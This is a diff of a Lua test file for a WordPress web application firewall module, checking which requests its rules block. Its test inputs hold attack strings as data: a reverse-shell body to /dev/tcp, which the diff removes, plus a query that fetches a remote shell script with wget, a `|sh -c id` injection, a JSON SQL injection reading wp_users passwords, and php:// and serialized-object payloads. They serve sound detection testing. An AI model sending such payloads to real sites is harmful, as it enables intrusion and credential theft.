@@ -7,10 +7,11 @@
 --   * on a GET (no Content-Type) the query side of the shared args+body surface
 --     was capped at 2 KB: 2 KB of padding hid php:// (305) and O:N:"…" (329)
 --     from every rule reading it, and 306 read a 2 KB query only;
---   * the RCE-marker rules (322-327) read a form-encoded body raw, so
---     `bash+-i+>%26+/dev/tcp/…` (a reverse shell to PHP) never matched;
 --   * rule 320 matched `;wget ` / `;curl ` / `|sh ` with a space only, and in a
 --     query string the space is `+`.
+-- (The RCE-marker rules 322-327 still read a form-encoded body raw, on
+-- purpose: decoding it would challenge — and, for a cleared admin, block and
+-- autoblock — classic-editor posts that mention `crontab -e`.)
 
 _G.ngx = {
   now           = function() return 1000 end,
@@ -60,10 +61,12 @@ do
   check(r.reason:find("^WAF_PHP_WRAPPER") and r.action == "block", "GET, 2 KB query pad, php:// → 305 (" .. show(r) .. ")")
   r = run{ method = "GET", args = "pad=" .. PAD .. '&d=O:8:"stdClass":1:{s:1:"a";s:1:"b";}' }
   check(r.ids:find(",329,", 1, true), "GET, 2 KB query pad, O:8:… → 329 (" .. show(r) .. ")")
-  r = run{ ct = "application/x-www-form-urlencoded", body = "cmd=bash+-i+>%26+/dev/tcp/198.51.100.4/4444+0>%261" }
-  check(r.reason:find("REVERSE_SHELL", 1, true), "form-encoded reverse shell → 322 (" .. show(r) .. ")")
+  r = run{ ct = "application/json", body = '{"id":"1\\tunion\\tselect user_pass from wp_users"}' }
+  check(r.reason:find("^WAF_SQLI"), "JSON \\t between SQL words decoded → SQLi (" .. show(r) .. ")")
   r = run{ method = "GET", args = "x=1;wget+http://198.51.100.4/x.sh" }
   check(r.ids:find(",320,", 1, true) and r.action == "block", "GET ;wget+ → 320 block (" .. show(r) .. ")")
+  r = run{ method = "GET", args = "a=x|sh+-c+id" }
+  check(r.ids:find(",320,", 1, true), "GET |sh+ → 320, as |sh%20 already was (" .. show(r) .. ")")
 end
 
 -- Rule 306 (serialize markers) reads the query to the request-line budget too.
@@ -84,6 +87,12 @@ do
     { ct = "application/x-www-form-urlencoded", body = "name=John+Smith&msg=I+use+bash+and+curl+daily" },
     { ct = "application/vnd.api+json", body = '{"data":{"type":"articles","attributes":{"title":"' .. PAD .. '"}}}' },
     { method = "GET", args = "q=install+wget+on+ubuntu&page=2" },
+    { method = "GET", args = "cat=a|shop+now&x=hair+curly+styles" },
+    -- Gutenberg serialises block attributes with \u0027 / \u002d\u002d, which
+    -- reach a REST JSON body as \\u0027: the text, never a quote or `--`.
+    { ct = "application/json", body = '{"content":"<!-- wp:x {\\"t\\":\\"it\\\\u0027s \\\\u002d\\\\u002d 1 OR 2\\"} /-->"}' },
+    -- An office document (vnd.openxmlformats-…) is a zip: the 2 KB budget, not XML's.
+    { ct = "application/vnd.openxmlformats-officedocument.wordprocessingml.document", body = "PK\3\4" .. ("x"):rep(100) },
   }
   for i, t in ipairs(clean) do
     local r = run(t)
@@ -107,10 +116,30 @@ do
   check(bb({ ["content-type"] = "application/soap+xml" }) == xml, "+xml gets the XML budget")
   check(bb({ ["content-type"] = "multipart/form-data; boundary=json" }) == bb({ ["content-type"] = "multipart/form-data" }),
         "multipart is matched before a `json` in its boundary")
+  check(bb({ ["content-type"] = "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet" }) ==
+        bb({ ["content-type"] = "application/octet-stream" }), "an office document keeps the 2 KB budget")
+  check(j('a\\\\u0027b') == 'a\\\\u0027b', "an escaped backslash is one unit: \\\\u0027 stays text")
+  check(j('a\\tb\\nc') == "a\tb\nc", "\\t / \\n decoded")
+  check(j('a\\U0027b') == 'a\\U0027b', "only a lowercase \\u is an escape")
+end
+
+-- An operator's cfm_waf_config.lua setting uri_scan_len to a string must not
+-- make check() raise (cfm.lua would fail open on every such request): loaded
+-- the real way, through a fresh cfm_waf (last: it re-initialises the util).
+do
+  package.loaded["cfm_waf"] = nil
+  package.loaded["cfm_waf_config"] = { uri_scan_len = "8192" }
+  local waf2 = require("cfm_waf")
+  check(waf2.get_config().uri_scan_len == "8192", "the override is in effect (fixture sanity)")
+  local ok, hit, reason = pcall(waf2.check, { uri = "/x", args = ("a"):rep(3000) .. "&f=php://filter/x", method = "GET",
+                                ip = "203.0.113.7", headers = { ["user-agent"] = UA }, body = "" })
+  check(ok, "a string uri_scan_len does not make check() raise (" .. tostring(hit) .. ")")
+  check(ok and tostring(reason):find("^WAF_PHP_WRAPPER"), "and the padded php:// is still caught (" .. tostring(reason) .. ")")
+  package.loaded["cfm_waf_config"] = nil
 end
 
 if fails > 0 then
   io.stderr:write(("cfm_waf scan-surface tests: %d FAILED\n"):format(fails))
   os.exit(1)
 end
-print("ok: cfm_waf scan surfaces (JSON escapes, +json budget, query pad, form-decoded markers, + as space)")
+print("ok: cfm_waf scan surfaces (JSON escapes, +json budget, query pad, + as space)")
